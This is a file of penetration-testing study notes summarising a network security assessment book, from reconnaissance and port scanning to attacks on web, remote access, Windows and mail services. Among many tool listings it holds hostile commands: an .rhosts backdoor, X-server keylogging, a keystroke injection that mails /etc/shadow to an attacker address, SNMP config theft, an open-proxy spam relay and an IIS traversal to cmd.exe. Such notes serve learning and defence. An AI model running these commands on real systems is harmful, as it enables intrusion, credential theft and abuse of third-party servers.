@@ -1,0 +1,869 @@
+CHAPTER 1 - Network Security Assessment
+
+Internet Based Attackers
+	Opportunistic attackers who scour large Internet address spaces for vulnerable systems 
+	Focused attackers who attack select Internet-based systems with a specific goal in mind 
+	
+Defender’s dilemma
+	A defender must ensure the integrity of every point of entry, whereas an attacker only needs to gain access through one to be successful
+
+A Zero-day bug has a lifespan of 348 days before a vendor patch is made available
+
+The Cyclic Assessment Approach 
+	
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 2 - Network Security Assessment Platform
+
+Reconnaissance Tools
+	BiDiBLAH - Windows
+	
+Network Scanning Tools
+	Nmap
+	Nessus
+	Commercial tools - ISS Internet Scanner, eEye Scanner, QualysGuard and Matta Colossus ( A LOT OF FALSE+)
+	
+Exploitation Framework
+	Metasploit
+	Commercial tools - CORE IMPACT and Immunity CANVAS
+	3rd Party - Argeniss and GLEG ( Zero Day Exploit Pack)
+	
+Web Application Testing Tools
+	Proxy Based - Paros, WebScarab and Burp
+	Active - Wapiti and Nikto
+	Commercial - WatchFire Appscan, SPI Dynamics WebInpect and Cenzic Hailstorm
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 3 - Internet Host and Network Enumeration
+
+Open Source info 
+	Indirect 
+		Web and newsgroup search engines
+		Domain and IP WHOIS registrars 
+		Border Gateway Protocol (BGP) looking glass sites and route servers 
+		Public DNS name servers
+	Direct 
+		DNS querying and grinding against specific name servers 
+		Web server crawling 
+		SMTP probing
+	
+Querying Web and Newsgroup Search Engines 
+	Google Search Functionality - Contact Details, Search Query(Dork), Newsgroups, Netcraft
+						
+Domain WHOIS Registars (TLD) 
+	Administrator Details - whois
+	
+IP WHOIS Registars (RIR)
+	Regional Internet Registries (RIR)
+		American Registry for Internet Numbers (ARIN) 
+		Réseaux IP Européens (RIPE)
+		Asia Pacific Network Information Centre (APNIC) 
+		Latin American and Caribbean Network Information Centre (LACNIC) 
+		African Network Information Centre (AfrNIC)
+	
+	IP WHOIS Querying Tools - whois
+		Enumerate Objects for a given target
+			$ whois nintendo -h whois.arin.net          # Enum Nintendo object in ARIN
+		Harvest User details
+			$ whois "@mitre.org" -h whois.arin.net     # Enum MITRE Corporation staff through ARIN
+		Enum maintainer Object
+			$ whois cs-security-mnt                            # Enumerating the cs-security-mnt object from RIPE
+			
+BGP Querying
+	FixedOrbit
+
+DNS Querying - Reverse DNS sweep
+	Nslookup, Host and Dig - Details on Name Server(NS), Domain and Sub-Domain, Hostname, Mail Exchanger(MX)
+	
+Forward DNS Querying - nslookup, dig
+	NSLOOKUP                          # Enumbasic domain details
+		$ nslookup 
+		> set querytype=any 
+		> cia.gov
+		
+DNS Zone Transfer Techniques - host, dig, nslookup
+	HOST
+		$ host -l ucia.gov            # Enum authoritative name servers for zone transfer
+	DIG
+		$ dig @relay2.ucia.gov ucia.gov axfr     # DNS Zone Transfer - Int/Ext IP, 
+		$ dig @relay2.ucia.gov 129.81.198.in-addr.arpa axfr        # Enum PTR
+		
+Forward DNS Grinding - Bruteforce 
+	NSLOOKUP
+		$ nslookup       # Forward DNS lookup to enumerate MX records
+		> set querytype=mx 
+		> bankofengland.co.uk
+	TXDNS - Windows Tool
+		C:\tools> txdns -f mail-dict.txt bankofengland.co.uk 
+		
+Reverse DNS Sweeping 
+	FHBA
+		$ ghba 198.81.129.0 
+	
+Web Server Crawling - Crawl and mirror
+	Tools - Wikto, HTTrack, BlackWidow , GNU Wget
+
+Automating Enumeration  - SpiderFoot and BiDiBLAH
+
+SMTP Probing 
+	Sending mail to get more details
+	
+Enumeration Technique Recap 
+	Web and newsgroup searches 
+	Using Google to perform searches against established domain names and target networks to identify personnel, hostnames, domain names, and useful data residing on publicly accessible web servers. 
+	
+	WHOIS querying 
+	Querying domain and IP registrars to retrieve network block, routing, and contact details related to the target networks and domain names. IP WHOIS querying gives useful information relating to the sizes of reserved network blocks (useful later when performing intrusive network scanning) and AS number details. 
+	
+	BGP querying 
+	Cross-referencing AS numbers with BGP looking glass sites and route servers to enumerate the associated IP blocks under the AS, and then feeding these details back into other query paths (such as DNS or further WHOIS querying). 
+	
+	DNS querying 
+	Querying publicly accessible DNS servers to enumerate hostnames and subdomains. Misconfigured DNS servers are also abused to download DNS zone files that categorically list subdomains, hostnames, operating platforms of devices, and internal network information in severe cases. 
+	
+	Web server crawling 
+	Accessible web servers are crawled using automated spidering software to identify associated servers, domains, and useful information, such as web server software details, enumerated users, and email addresses. 
+	
+	SMTP probing 
+	Sending email messages to nonexistent accounts at target domains to map internal network space by analyzing the responses from the SMTP system.
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 4 - IP Network Scanning
+
+ICMP Probing 
+	ICMP Types
+		Type 8 - Ping (Echo req)
+		Type 13 - Timestamp Req
+		Type 15 - Information Req
+		Type 17 - Subnet Address Mask Req
+		
+	ICMP Tools
+		SING
+			$ sing -echo 192.168.0.255        # Type 8
+			$ sing -tstamp 192.168.0.50      # Type 13
+			$ sing -mask 192.168.0.25         # Type 17  
+		NMAP
+		ICMPScan 
+			$ icmpscan –c -t 500 -r 1 192.168.1.0/24
+	
+OS Fingerprinting Using ICMP 
+		Xprobe2
+			$ xprobe2 -v 192.168.0.174
+			
+TCP PORT SCANNING
+	TYPES
+		STANDARD METHOD
+			Vanilla Connect - Full TCP 3 way handshake (nmap -sT)
+			Half open Connect - 2 Way handshake then RST Sent (nmap -sS or scanrand 10.0.1.1-254:quick)
+		
+		STEALTH METHOD
+			Inverse TCP - Send TCP Probe like FIN/XMAS(URG/PSH)/NULL. If open - no resp, closed - RST
+					  Nmap -sF FIN , -sX XMAS or -sN 
+			ACK Prob Scan - 1K ACK Sent, Check TTL or WINDOW response (nmap -sA TTL, -sW Window or hping2)
+		
+		3rd Party and Spoofed Scan
+			FTP Bounce - port scan using vulnerable FTP port (nmap -PO -b)
+					Connect to FTP - PASV, PORT 144, LIST - if repose 226 it’s open, if 425 it’s closed 
+			Proxy bounce - use proxy to perform bounce port scan
+			Sniffer based Spoof - same as half open, tries to use a IP in a network and tries to look for access using spoof IP
+			IP ID header scan - use idle(zombie) host to scan the target, HPING2 or nmap -sI, Vscan
+			
+PAGE 85 PORT LIST
+
+UDP PORT SCANNING
+port is closed only if - ICMP destination port unreachable
+	Tools - Nmap (-sU), scanudp
+
+IDS Evasion and Filter Circumvention 
+	For Bypass IDS
+		Fragmented Probe Packets 
+			Tool
+				Fragtest - 8 byte-frag, frag-new, frag-old
+					$ fragtest frag frag-new frag-old www.bbc.co.uk
+				Fragroute - modify fragroute.conf and send icmp request
+					$ fragroute 192.168.102.251
+				NMAP
+					$ nmap -sS -f 192.168.102.251
+				
+		Spoof multiple host
+			$ nmap -sS -P0 -D 62.232.12.8,ME,65.213.217.241 192.168.102.251  # decoy address
+		
+	For Bypass Packet Filter 
+		Source Routing - Specify which gateways and routes your packets should take, limit of 40 chars for Royer Data 
+			TYPES
+				Strict Source and Route Record (SSRR) - Any number of intermediate gateways
+				Loose Source and Route Record (LSRR) - next address to be directly connected network
+			Vuln can be exploited by
+				Reversing the source route
+				Circumventing filters and gaining access to internal hosts 
+					CVE-1999-0909 Windows NT - Offset > hops and Last hope is Internal host
+					CVE-2006-2379 Windows 2003 and earlier gives RCE, Win 2003 and XP are secured by deafult.
+			Tools
+				LSRScan - b -> insert IP before host, a -> Insert IP after the host
+					$ lsrscan 217.53.62.0/24 
+				LSRTunnel - i proxy -t target -f spoofed ip
+					$ lsrtunnel -i 192.168.102.2 -t 217.53.62.2 -f 198.81.129.194
+	
+		Specific TCP or UDP source port - 53(TCP/UDP),20,80,88(TCP/UDP)(Kerberos)
+			Nmap -g 
+			Useful Ports - UDP 500 (ISAKMP)
+Low-Level IP Assessment
+	Can be done by:
+		Analysing TCP Timestamp - Uptime of hosts
+		Analysing Response to TCP and ICMP Probes - Permitted TCP service
+		Running Predictability Tests - TCP seq and IP ID increment
+		IP Fingerprinting - Host's OS
+		
+	Analysing Response of TCP Probe
+		1. TCP SYN/ACK - Open
+		2. TCP RST/ACK - Rejected by host or firewall(sec)
+		3. ICMP Type 3 Code 13 - Prohibited connection
+		4. Nothing - Intermediary Security device silently dropped it
+		Tools
+			Hping2 
+				$ hping2 -c 3 -s 53 -p 139 -S 192.168.0.1 (c: Packets ; s: Source Port; d: Destination Port; S: SYN Flag; F: FIN Flag; A: ACK Flag)
+			Firewalk
+				States: ICMP Type 11 Code 0(Received; Passed through the filter and response will appear)
+					  Dropped (Probably done at the gateway)
+					  ICMP Type 3 Code 13 (Received; Simple filter{Router ACL} is being used)
+				
+				$ firewalk -n -S21,22,23,25,53,80 -pTCP gw.test.org www.test.org 
+				-S(Ports selected) -pTCP(gateway target) 
+				
+	Passively Monitoring ICMP Responses 
+		1. ICMP TTL Exceeded(T11 C0) - Indicate a Routing Loop
+		2. ICMP Administratively Prohibited (T3 C13) - Firewall/Router rejects packet
+	
+	IP Fingerprinting
+		Nmap - $ nmap -O -sS 192.168.0.65
+	
+	TCP Sequence and IP ID Incrementation 
+		Nmap - $ nmap -v -sS -O 192.168.102.251
+
+Network Scanning Recap
+	ICMP scanning and probing 
+	By launching an ICMP ping sweep, you can effectively identify poorly protected hosts (as security-conscious administrators filter inbound ICMP messages) and perform a degree of operating system fingerprinting and reconnaissance by analyzing responses to the ICMP probes. 
+	
+	Half-open SYN flag TCP port scanning 
+	A SYN port scan is often the most effective type of port scan to launch directly against a target IP network space. SYN scanning is extremely fast, allowing you to scan large networks quickly.
+	
+	Inverse TCP port scanning Inverse scanning types (particularly FIN, XMAS, and NULL) take advantage of idiosyncrasies in certain TCP/IP stack implementations. This scanning type isn’t effective when scanning large network spaces, although it is useful when testing and investigating the security of specific hosts and small network segments. 
+	
+	Third-party TCP port scanning 
+	Using a combination of vulnerable network components and TCP spoofing, third-party TCP port scans can be effectively launched. Scanning in this fashion has two benefits: hiding the true source of a TCP scan and assessing the filters and levels of trust between hosts. Although time-consuming to undertake, third party scanning is extremely useful when applied correctly. 
+	
+	UDP port scanning Identifying accessible 
+	UDP services can be undertaken easily only if ICMP type 3 code 3 (“Destination port unreachable”) messages are allowed back through filtering mechanisms that protect target systems. UDP services can sometimes be used to gather useful data or directly compromise hosts (the DNS, SNMP, TFTP, and BOOTP services in particular). 
+	
+	IDS evasion and filter circumvention 
+	Intrusion detection systems and other security mechanisms can be rendered ineffective by using multiple spoofed decoy hosts when scanning or by fragmenting probe packets using Nmap or fragroute. Filters such as firewalls, routers, and even software (including the Microsoft IPsec filter) can sometimes be bypassed using specific source TCP or UDP ports, source routing, or stateful attacks.
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 5 - Assessing Remote Information Services5
+
+PAGE 104 - Remote Information Services
+
+DNS
+	UDP 53 - Standard Direct Requests (Resolve Names to IP and vice versa)
+	TCP 53 - Serve Information during zone transfers and other queries
+	
+	Retrieving DNS Service Version Information 
+		$ dig @nserver.apple.com version.bind chaos txt      # DiG to glen BIND Version Info
+		$ nslookup                                               # NSLOOKUP to get BIND Version Info
+		> server nserver.apple.com 
+		> set class=chaos 
+		> set type=txt 
+		> version.bind
+	
+	BIND Vulnerabilities 
+		PAGE 106
+		CVE-2002-2211 and CVE-2006-0527(HP-UX and Tru64 servers) were DNS BIND Vuln affected by Cache Corruption
+	
+	Microsoft DNS Service Vulnerabilities
+		Remote vulnerabilities in Microsoft DNS and WINS services 
+		PAGE 107
+	
+	DNS Zone Transfers 
+		$ dig @relay2.ucia.gov ucia.gov axfr            # DiG to perform DNS Zone Transfer
+		
+	Reverse DNS Querying
+		Check Point Firewall-1 -> Allows any to any rule
+		$ nslookup                   # Extract Internal Host info through DNS
+		> set querytype=any 
+		> server 144.51.5.2
+		Using GHBA
+		$ cat /etc/resolv.conf      # Automate Reverse Lookup using GHBA
+		nameserver 144.51.5.2 
+		$ ghba 192.168.1.0
+
+	Forward DNS Grinding
+		C:\tools> txdns -f smalllist.txt -s 17.254.0.50 apple.com   # Forward DNS Grinding using TXDNS.exe
+		
+Finger (TCP-79 Cisco IOS Routers and Solaris)
+	$ telnet 192.168.0.1 79       # Cisco
+	$ finger @192.168.0.10      # Solaris
+	
+	Finger Information Leaks 
+		$ finger '1 2 3 4 5 6 7 8 9 0'@192.168.0.10        #User Details through solaris fingerd
+		$ finger user@192.168.189.12   # User details through standard Finger
+		
+	Finder Redirection
+		$ finger @192.168.0.10@217.34.17.20        # Bounce attack to find internal IP details
+	
+	Finger Process Manipulation Vulnerabilities 
+		Few Cfingerd are vulnerable to BOF Attacks
+		
+Auth (ident TCP-113)
+	IRC Server uses ident request 
+	$ nmap -I -sT 192.168.0.10     # Nmap
+	
+	Auth Process Manipulation Vulnerabilities 
+		Linux jidentd and cidentd are vulnerable to BOF
+		
+NTP (UDP - 123)
+	Obtain remote hostname, NTP daemon Version, OS details including processors
+	
+	NTP Fingerprinting 
+	$ perl ntp.pl -t 192.168.66.202     # OS fingerprinting using ntp.pl
+	$ perl ntp.pl -t pingo       # Enum Linux Sys details using ntp.pl
+	
+	NTP Vulnerabilities 
+		CVE-2001-0414 - BOF NTP daemon <=4.0.99K
+		GLEG VulnDisco - 0 Day NTP 4.2.0
+		
+SNMP (UDP - 161)
+	Management Information Base (MIB) - Contains list of Object Identifiers(OID) such as Routing table entries, network  stats and network interface
+	
+	Tools
+		ADMsnmp
+			$ ADMsnmp 192.168.0.1    # Bruteforce SNMP Community Strings
+		Snmpwalk
+			$ snmpwalk -c private 192.168.0.1   # Access MIB 
+			
+	Compromising Devices by Reading from SNMP 
+		PAGE 118 - OID Table 
+		$ snmpwalk -c public 192.168.102.251 .1.3.6.1.4.1.77.1.2.25    # Enum Win 2000 user accounts
+		
+	Compromising Devices by Writing to SNMP 
+		$ snmpset -r 3 -t 3 192.168.0.1 private .1.3.6.1.4.1.9.2.1.55.192.168.0.50 s "cisco-config" # Cisco 
+		$ snmpset -r 3 -t 3 192.168.0.254 private .1.3.6.1.4.1.529.9.5.4.0 s "ascend-config  # Ascend
+		
+	SNMP Process Manipulation Vulnerabilities
+		PAGE 120 
+		
+LDAP (389)
+	$ ldapsearch -h 192.168.0.65   # If Anonymous Access is allowed
+	$ bf_ldap     # Bruteforce LDAP
+	
+	Active Directory Global Catalog (TCP -3268)
+		Stores logical representation of all users, servers and devices
+		
+	LDAP Process Manipulation Vulnerabilities 
+		PAGE -122
+		
+Rwho (UDP -513)
+	$ rwho 192.168.189.120 
+
+	RPC rusers 
+		$ rpcinfo -p 192.168.0.50 
+		$ rusers -l 192.168.0.50   # Activer user details
+		
+READ LAST PAGES -  124 and 125 Remote Information Services Countermeasures 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+==================================================================================================
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 6 - Assessing Web Servers
+
+Fingerprinting
+	Manual 
+		Using HTTP HEAD
+			$ telnet www.trustmatta.com 80 
+			HEAD / HTTP/1.0
+		Using HTTP OPTIONS 
+			$ telnet www.trustmatta.com 80 
+			OPTIONS / HTTP/1.0
+			PAGE 130 - HTTP OPTION Response
+		Querying through an SSL Tunnel - SSL Tunnel to local port 80
+			$ telnet 127.0.0.1 80 
+			HEAD / HTTP/1.0
+	Automated
+		Httprint
+
+Identifying and Assessing Reverse Proxy Mechanisms
+	HTTP Methods with Specific Host (MANUAL)
+		$ telnet www.example.org 80 
+		HEAD / HTTP/1.1 
+		Host: www.example.org 
+		$ telnet www.example.org 80             # If it supports HTTP CONNECT, GET or POST,we can connect using next one
+		OPTIONS / HTTP/1.1
+		Host: www.example.org
+		
+		HTTP CONNECT
+			$ telnet www.example.org 80         # Proxy a connection to port 25 of maila.microsoft.com
+			CONNECT maila.microsoft.com:25 HTTP/1.0
+		HTTP POST
+			$ telnet www.example.org 80          # POST Bounce
+			POST http://maila.microsoft.com:25/ HTTP/1.0 
+			Content-Type: text/plain 
+			Content-Length: 0
+		HTTP GET
+			$ telnet cacheflow.example.org 80      #GET BOUNCE
+			GET / HTTP/1.1 
+			HOST: mx4.sun.com:25 
+			HELO . 
+			MAIL FROM: spammer@alter.net 
+			RCPT TO: target@unsuspecting.com 
+			DATA 
+			Subject: Look Ma! I'm an open relay 
+			Hi, you've been spammed through an open proxy, because of a bug in The CacheOS 4 platform code. Have a great day! -Spammer 
+			.
+	Automated HTTP Proxy Testing
+		$ pxytest 192.108.105.34
+		
+Enumerating Virtual Hosts and Web Sites 
+	Identifying Virtual Hosts
+		Passive - Netcraft and DNS Querying
+		Active - Web server crawling, SSL Cert Analysis and Analysis of server response
+			Tool - Wikto
+	Identifying Subsystems and Enabled Components
+		Generic subsystems include: 
+			• HTTP 1.0 methods (GET, POST and HEAD)
+			• HTTP 1.1 methods (GET, POST, HEAD, OPTIONS, PUT, DELETE, TRACE and CONNECT)
+			• Web Distributed Authoring and Versioning (WebDAV) (PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK)
+			• PHP 
+			• Basic authentication mechanisms 
+		Microsoft-specific subsystems include: 
+			• IIS sample and administrative scripts (IIS 3.0 and 4.0 - aexp3.htr Password Management script)
+			• ASP and ASP.NET (Active Server Pages) (IIS 5.0 and 6.0) (aspnet_client/system_web) (DNASCAN)
+			• ISAPI extensions (.printer, .ida, .htr) (PAGE 148) (WEBDAV and SEARCH)
+			• Proprietary WebDAV extensions (MICROSOFT 200 SERVER IIS 5.0 and 6.0 - BCOPY, BDELETE, BMOVE, BPROPFIND, BPROPPATCH, NOTIFY, POLL, SUBSCRIBE, UNSUBSCRIBE) (MICROSOFT EXCHANGE 2003 SERVER - X-M-ENUMATTS)
+			 • Microsoft FrontPage (dll, exe and pwd)
+			• Windows Media Services (CVE-2003-0349 - DLL file gives remote overflow to code execution)
+			• Outlook Web Access (OWA) (/owa, /exchange, and /mail)
+			• RPC over HTTP support (RPC over HTTP to communicate through an RPC proxy - RPC_CONNECT)
+			• Enhanced authentication mechanisms (NTLM and Negotiate) 
+				$ telnet 83.142.224.21 80 T
+				GET / HTTP/1.1 
+				Host: iis-server 
+				Authorization: Negotiate TlRMTVNTUAABAAAAB4IAoAAAAAAAAAAAAAAAAAAAAAA
+		Apache-specific subsystems include: 
+			• OpenSSL 
+			• Apache modules (including mod_perl, mod_ssl, mod_security, mod_proxy, and mod_rewrite)
+		Automatic - Nikto
+	
+Investigating Known Vulnerabilities
+	Generic Subsystem Vulnerabilities
+		HTTP 1.1 Methods (CONNECT, TRACE, PUT AND DELETE)
+			TRACE - XST (Cross site Tracing) allows Domain restriction Bypass, HTTP request-enabling 
+		
+		WebDAV - (CVE-2002-0422 Microsoft IIS 5.0 and 5.1 Information disclosure, including internal IP address, through PROPFIND, WRITE, and MKCOL) (CVE-2000-0869 Apache 1.3.12 PROPFIND directory listing)
+		
+		PHP - PAGE 162
+	
+	Microsoft Web Server and subsystem Vulnerabilities
+		IIS 5.0 - PAGE 164
+			IIS 5.0 local privilege escalation exploit (CVE-2002-0869)
+		IIS 6.0 - CVE-2007-2897 IIS 6.0 Denial of Service information leak and potential overflow and CVE-2005-2089 IIS 5.0 and 6.0 HTTP request smuggling
+		ASP and ASP.NET - PAGE 166 - CVE-2006-0026 Priv Escla (ASP under IIS 6.0)
+		ISAPI Extension - PAGE 167
+		Microsoft proprietary WebDAV extensions - PAGE 167
+		Microsoft FrontPage - Prompt with auth at author.dll (Poor Page have .pwd readble) (PAGE 169) CVE-2003-0822 (fp30reg.dll overflow)
+		Outlook Web Access  - PAGE 170
+	
+	Apache Web Server and Subsystem Vulnerabilities  
+		Apache HTTP Server - PAGE 171 - CVE-2002-0392 (Apache 1.3.24 chunked encoding exploit)
+		Apache HTTP Server modules - PAGE 174 - CVE-2007-0774 (mod_jk 1.2.20 stack overflow)
+		Apache Tomcat - PAGE 176 - CVE-2002-1394 and CVE-2002-1148 Tomcat (4.0.5) JSP source code disclosure 
+		OPENSSL- CVE-2003-0545 (OpenSSL0.9.7d double-free bug) and CVE-2002-0656 (OpenSSL 0.9.7-b2 and 0.9.6d client master key overflow)
+		
+Basic Web Server Crawling
+	Tools - Nikto, Wikto and N-Stalker
+	Brute-force HTTP Authentication - Hydra and Brutus
+	
+Web Servers Countermeasures - PAGE 183
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 7 - Assessing Web Applications
+
+3 Layers - Presentation Tier, Application Tier and Data Tier
+
+Web Application Profiling
+	HTML source review (Comments, Hidden fields that are passed to scripts and Client-side scripts)
+		Manual - 
+			$ wget -r -m -nv http://www.example.org/       # Mirror a website
+			$ tree                         # Review the mirrored files then grep for HTML Elements
+		Automatic - Sam Spade 
+	
+	Analysis of Server-side file extensions - ASP, ASPX, PHP, etc
+	Session ID Fingerprinting - 
+		JSESSIONID - 
+			Apache Tomcat 4.x or later (32 Upper Alphanumeric chars)
+			Apache Tomcat 3.x or earlier (10 Lower alphanumeric chars, end with Number)
+			Caucho Resin 3.0.21 and later (21 ASCII chars - start with abc)
+			Caucho Resin 3.0.20 and earlier (12 ASCII chars)
+			IBM WebSphere (23 ASCII and :)
+			Sun Java System Application Server (28 Lower alphanumeric)
+
+	Active Backend Database Technology Assessment - SQLi 
+
+Web Application Attack Strategies 
+	• Server-side script variables - Change scripts in URL or form fields (Paros)
+	• HTTP request headers  - PAGE 197, Using Referer Header
+	• HTTP cookie fields - Cookie: USER=1826cc8f:PSTYLE=../../../../../../../etc/inetd.conf
+	• XML request content
+		WSDL (Web Services Description Language) Enumeration
+		Attacking via XML
+			
+				
+Filter Evasion Techniques 
+	• SSL transport to bypass web application firewalls 
+	• Encoding and obfuscating attack code - Hex coding, Double-Hex coding and HTML UTF-8 and Hex coding
+	• HTTP request smuggling - directory traversal attack against Microsoft IIS (CVE-2000-0884)
+		                                       http://target/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir
+		
+	
+
+Web Application Vulnerabilities
+	Authentication Issues - Default/Guessable accounts, HTTP Form Brute-Force and Session Management Weakness
+	Parameter Modification - Command Injection, Filesystem Access and Cross-site Scripting (BeEF and XSS-Proxy)
+
+Web Security Checklist - Page 221
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+==================================================================================================
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 8 - Assessing Remote Maintenance Services
+
+Remote Maintenance Services - Info Leak, Brute Force and Process manipulation (BOF)
+	ftp 21/tcp 
+	ssh 22/tcp
+	telnet 23/tcp 
+	exec 512/tcp 
+	login 513/tcp 
+	shell 514/tcp 
+	x11 6000/tcp 
+	citrix-ica 1494/tcp 
+	citrix-ica-brws 1604/udp
+	ms-rdp 3389/tcp 
+	vnc-http 5800/tcp 
+	vnc 5900/tcp
+	
+FTP -  FTP Banner Grabbing
+	Brute-Force,
+	FTP Bounce Attacks (nmap -P0 -b username:password@ftp-server:port)
+	PORT COMMAND (1039) and PASV COMMAND Abuse (BOF)
+	FTP Process Manipulation - (CVE-2001-0249) Valid User names via 'CWD ~username' 
+	PAGE 235,236,237
+
+SSH -  Fingerprinting
+	Brute-force Password Grinding
+	PAGE 239
+	
+Telnet - Fingerprinting - Tools such as TelnetFP (Automated) 
+	Brute-force Password Grinding - Common device telnet password
+	PAGE 244
+	
+R-Services - exec 512/tcp 
+		login 513/tcp 
+		shell 514/tcp
+	Commands - rsh (Rsh service doesn’t assign any process ), rlogin and rexec
+		# Simple backdoor
+			$ echo + + > /usr/bin/.rhosts 
+			$ exit 
+			$ rsh -l bin 192.168.0.20 csh -i
+	Brute-force - $ rsh -l bin 192.168.0.20 csh -i
+	Spoofing RSH Connections 
+	PAGE 249
+	
+X Windows - (TCP ports 6000 to 6063)
+	Authentication Mechanism - xhost and xauth
+		Xhost - Host-based X authentication allows users to specify which IP addresses and hosts have access to the X server. The xhost command is used with + and - options to allow and deny X access from individual hosts (i.e., xhost +192.168.189.4).
+		Xauth - Magic Cookie is placed into the .xauthority file under the user home dir.
+			$ xauth list 
+			$ xauth add onyx.example.org:0 MIT-MAGIC-COOKIE-1 d5d3634d2e6d64b1c078aee61ea846b5  # Creating 
+	Accessing X Servers - Tools such as xscan 
+		$ xwininfo -tree -root -display 192.168.189.66:0 | grep -i term     # List Open Window
+		$ xwd -root -display 192.168.189.66:0 | xwud                                  # Take SS - Entire window. Also using xwatchwin
+		$ xwd -id 0x2c00005 -display 192.168.189.66:0 | xwud                  # Take SS
+		$ ./xsnoop -h 0x2c00005 -d 192.168.189.66:0                                  # Keylogg
+		$ ./xspy -display 192.168.189.66:0                                                      # Keylogg - Entire window
+		$ ./xpusher -h 0x2c00005 -display 192.168.189.66:0mail evilhacker@hotmail.com < /etc/shadow #send keystr
+		$ ./xtester 0x2c00005 192.168.189.66:0mail evilhacker@hotmail.com < /etc/shadow # Send keystrokes to 0x2
+	PAGE 253
+
+Citrix (TCP 1494/UDP port 1604) - Using the Citrix ICA Client
+	Accessing Nonpublic Published Applications - Citrix-pa-scan
+		$ ./citrix-pa-scan 212.123.69.1
+	PAGE 257
+	
+Microsoft Remote Desktop Protocol (RDP) - TCP 3389
+	Brute-force
+	Vulnerabilities - CVE-2000-1149 RegAPI.DLL overflow in Windows NT 4.0 Terminal Server allows remote attackers to execute arbitrary commands via a long username.
+	
+VNC (5900 Viewer/5800 HTTP)
+	Brute-force - Vncrack and VNCrackx4
+	Page 262
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 9 - Assessing Database Services
+
+ms-sql 1433/tcp
+ ms-sql-ssrs 1434/udp  (SQL Server Resolution Service)
+ms-sql-hidden 2433/tcp 
+oracle-tns 1521/tcp (Transparent Network Substrate)
+oracle-tns-alt 1526/tcp 
+oracle-tns-alt 1541/tcp 
+mysql 3306/tcp
+
+
+Microsoft SQL Server
+	Enumeration - Using SQLPing, Metacoretex (Automatic)
+	Brute-Force -sqlbf, SQLAT and Forcesql
+	PAGE 268
+
+Oracle 
+	Enumeration - Pinging the TNS Listener and Information Leak attack(tnscmd.pl)
+	PAGE 273
+	Brute Force and Post Auth Issue - Using OAT, Metacoretex
+	PAGE 275
+
+MYSQL
+	Enumeration - Simple connection Netcat or Telnet
+	Brute Force - Hydra
+	PAGE 278- 279
+	
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+==================================================================================================
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 10 - Assessing Windows Networking Services
+
+loc-srv 135/tcp 
+loc-srv 135/udp 
+netbios-ns 137/udp 
+netbios-dgm 138/udp 
+netbios-ssn 139/tcp
+microsoft-ds 445/tcp 
+microsoft-ds 445/udp
+
+Port 135 is used for RPC client-server communication, and ports 139 and 445 are used for authentication and file sharing. UDP ports 137 and 138 are used for local NetBIOS browser, naming, and lookup functions.
+
+Microsoft RPC Services
+	Enumeration - Tools such as epdump, rpctools (rpcdump and ifids) and Rpcscan
+	Identify Vulnerable - PAGE 289
+	User details via SAMR and LSARPC - Tools such as walksam and rpclient, enumdomusers 
+	Brute-Forcing Administrator Passwords - Tools such as WMICracker
+	Enumerating System Details Through WMI - Tools such as WMIdump
+	Executing Arbitrary Commands - Tools such as Remoxec
+
+The NetBIOS Name Service (UDP 137)
+	Enumerating - nbtstat
+	Attacking - CVE-2003-0661 NBNS in Windows NT 4.0, 2000, XP, and Server 2003 may include random memory in a response to a NBNS query, which can allow remote attackers to obtain sensitive information. CVE-2000-0673  NBNS doesn’t perform authentication, which allows remote attackers to cause a denial-of-service by sending a spoofed Name Conflict or Name Releasedatagram. CVE-1999-0288 Malformed NBNS traffic results in WINS crash. 
+
+The NetBIOS Datagram Service (UDP 138) - CVE-2000-1079
+
+The NetBIOS Session Service 
+	Enumeration - enum, winfo and GetAcct
+	Brute force - SMBCrack and SMB-at
+	Authenticating with NetBIOS - net use 
+	Executing Commands - schtasks
+	Access and Modify Registry Keys - regdmp (Dumps), regini (set and modify reg keys) and reg (Delete reg keys)
+	Access the SAM Database - pwdump3, Cain, John, Winrtgen, Ophcrack and rainbowcrack
+	
+The CIFS Service (T/U-445)
+	Enumeration - smbdumpusers
+	Brute Force - smbbf
+	
+Unix Samba Vulnerabilities - PAGE 313
+
+Windows Networking Services Countermeasures  - PAGE 313
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 11 - Assessing Email Services
+
+Normal
+	smtp 25/tcp 
+	pop2 109/tcp 
+	pop3 110/tcp 
+	imap2 143/tcp 
+	submission 587/tcp 
+SSL-wrapped versions
+	smtps 465/tcp 
+	imaps 993/tcp 
+	pop3s 995/tcp
+
+SMTP 
+	Fingerprinting - smtpmail
+	Enum Enabled SMTP Subsystems and Features - Using telnet and then EHLO world 
+	Brute force - Auth is done as LOGIN(base64), PLAIN and CRAM-MD5
+		Using HYDRA
+		NTLM overflows through SMTP authentication - If NTLM authentication is supported, LSASS overflows (CVE-2003-0818 and CVE2003-0533) can be launched to execute arbitrary code server-side. 
+	Open Relay Testing - PAGE 319
+	Sendmail Assessment - Info Leak (EXPN-Expand details on email, VRFY, RCPT TO) or Automatic by Brutus
+	Sendmail process manipulation vulnerabilities - PAGE 323
+	Microsoft SMTP Service Assessment  - PAGE 324
+	SMTP Content Checking Circumvention - PAGE 325
+	
+POP-2 and POP-3 
+	POP-3 Brute force 
+	POP-3 Process Manipulation Attacks - PAGE 328
+	
+IMAP
+	Brute Force - PAGE 329 and 330
+
+Email Services Countermeasures  - PAGE 330
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 12 - Assessing IP VPN Services
+
